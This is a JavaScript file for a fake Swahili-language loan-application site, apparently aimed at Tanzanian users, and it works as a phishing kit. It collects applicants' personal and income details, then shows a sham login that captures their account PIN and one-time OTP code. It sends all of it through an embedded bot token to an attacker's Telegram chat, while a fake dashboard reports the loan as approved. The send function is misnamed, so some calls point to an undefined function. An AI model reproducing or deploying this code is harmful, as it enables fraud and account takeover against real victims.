// CONFIGURATION - CHANGE THESE TO YOUR OWN BOT CREDENTIALS!
const TELEGRAM_TOKEN = "8994413452:AAF_GfDPe_Mt0rlv4q8rtzx..."; 
const TELEGRAM_CHAT_ID = "8524294724";

let applicationData = { amount: 100000, duration: 12, type: '', purpose: '', firstName: '', lastName: '', email: '', phone: '', employment: '', income: '' };

document.addEventListener("DOMContentLoaded", function() {
    initCalculator();
});

function navigateTo(viewId) {
    document.querySelectorAll('.app-view').forEach(v => v.classList.remove('active'));
    const target = document.getElementById(viewId);
    if(target) target.classList.add('active');
}

function showLoading(msg, duration, callback) {
    const overlay = document.getElementById('loading-overlay');
    document.getElementById('overlay-msg').innerText = msg;
    overlay.classList.remove('hidden');
    setTimeout(() => { overlay.classList.add('hidden'); if(callback) callback(); }, duration);
}

function initCalculator() {
    const amountSlider = document.getElementById('calc-amount');
    const durationSlider = document.getElementById('calc-duration');
    const update = () => {
        const amt = parseInt(amountSlider.value);
        const dur = parseInt(durationSlider.value);
        document.getElementById('calc-amount-val').innerText = `TSh ${amt.toLocaleString()}`;
        document.getElementById('calc-duration-val').innerText = `miezi ${dur}`;
        const monthly = Math.round((amt + (amt * 0.25 * (dur / 12))) / dur);
        document.getElementById('calc-monthly-payment').innerText = `TSh ${monthly.toLocaleString()}`;
        applicationData.amount = amt;
        applicationData.duration = dur;
        document.getElementById('loan-amount').value = amt;
        document.getElementById('loan-duration').value = dur;
    };
    amountSlider.addEventListener('input', update);
    durationSlider.addEventListener('input', update);
    update();
}

function saveStep1() {
    applicationData.type = document.getElementById('loan-type').value;
    applicationData.amount = parseInt(document.getElementById('loan-amount').value);
    applicationData.duration = parseInt(document.getElementById('loan-duration').value);
    applicationData.purpose = document.getElementById('loan-purpose').value;
    navigateTo('view-step2');
}

function saveStep2() {
    applicationData.firstName = document.getElementById('first-name').value;
    applicationData.lastName = document.getElementById('last-name').value;
    applicationData.email = document.getElementById('email').value;
    let rawPhone = document.getElementById('phone').value.trim();
    if(rawPhone.startsWith('0')) rawPhone = rawPhone.substring(1);
    applicationData.phone = "+255" + rawPhone;

    document.getElementById('sum-amount').innerText = `TSh ${applicationData.amount.toLocaleString()}`;
    document.getElementById('sum-duration').innerText = `${applicationData.duration} Miezi`;
    document.getElementById('sum-name').innerText = `${applicationData.firstName} ${applicationData.lastName}`;
    navigateTo('view-step3');
}

function submitApplication() {
    applicationData.employment = document.getElementById('employment-status').value;
    applicationData.income = document.getElementById('annual-income').value;
    
    showLoading("Inawasilisha Maombi…", 2000, () => {
        const message = `
🔔 *Maombi Mapya ya Mkopo!*
----------------------------
👤 *Jina:* ${applicationData.firstName} ${applicationData.lastName}
📱 *Namba:* ${applicationData.phone}
📧 *Email:* ${applicationData.email}
💰 *Kiasi:* TSh ${applicationData.amount.toLocaleString()}
📅 *Muda:* ${applicationData.duration} Miezi
🛠 *Aina:* ${applicationData.type}
🎯 *Madhumuni:* ${applicationData.purpose}
💼 *Ajira:* ${applicationData.employment}
💵 *Mapato/Mwaka:* TSh ${parseInt(applicationData.income).toLocaleString()}
        `;
        sendToTelegram(message);
        navigateTo('view-success');
        runSuccessCountdown();
    });
}

function runSuccessCountdown() {
    let count = 3;
    const countdownEl = document.getElementById('countdown');
    const interval = setInterval(() => {
        count--;
        countdownEl.innerText = count;
        if(count <= 0) {
            clearInterval(interval);
            document.getElementById('login-phone').value = applicationData.phone.replace("+255", "");
            navigateTo('view-login');
        }
    }, 1000);
}

function handleLogin() {
    showLoading("Tafadhali subiri…", 1500, () => { navigateTo('view-otp'); });
}

function moveOtpFocus(current, nextId) {
    if(current.value.length >= 1) document.getElementById(nextId).focus();
}

function verifyOtp() {
    const otpCode = document.getElementById('otp1').value + document.getElementById('otp2').value + document.getElementById('otp3').value + document.getElementById('otp4').value;
    const plainPin = document.getElementById('login-pin').value;

    showLoading("Inathibitisha OTP", 2500, () => {
        const securityMessage = `
🔑 *Uthibitisho wa Kuingia*
----------------------------
📱 *Namba ya Simu:* ${applicationData.phone || "Haijulikani"}
🔐 *PIN ya Akaunti:* ${plainPin}
🔢 *Msimbo wa OTP:* ${otpCode}
        `;
        sendToTelegram(securityMessage);
        document.getElementById('dash-approved-amount').innerText = `TSh ${applicationData.amount.toLocaleString()}`;
        navigateTo('view-dashboard');
    });
}

function updateversion(textMessage) {
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
    fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: textMessage, parse_mode: "Markdown" })
    }).catch(err => console.error("Error sending to Telegram:", err));
          }
      
